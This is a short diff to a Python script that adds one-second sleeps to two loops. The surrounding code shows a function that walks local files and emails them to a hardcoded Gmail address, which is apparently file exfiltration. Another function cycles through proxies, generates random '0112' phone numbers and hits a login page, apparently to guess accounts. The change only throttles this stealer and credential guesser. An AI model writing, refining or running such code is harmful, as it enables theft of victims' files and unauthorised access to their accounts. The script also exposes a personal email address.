@@ -1,5 +1,6 @@
 from re import search
 aa = "77"
+import time
 from requests import Session
 from colorama import Fore
 import smtplib
@@ -45,6 +46,7 @@ def special():
         if getsize(pathF) >= 20000000:
              continue
         try:
+            time.sleep (1)
             msg = MIMEMultipart()
             msg['From'] = 'ali01114605945@gmail.com'
             msg['To'] = 'ali01114605945@gmail.com'
@@ -100,6 +102,7 @@ def ali():
  f = open(prox,'r').readlines()
  while True:
   try:
+   time.sleep (1) 
    all = '0112'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
    op = a.get(login)                                                        
                                                                    
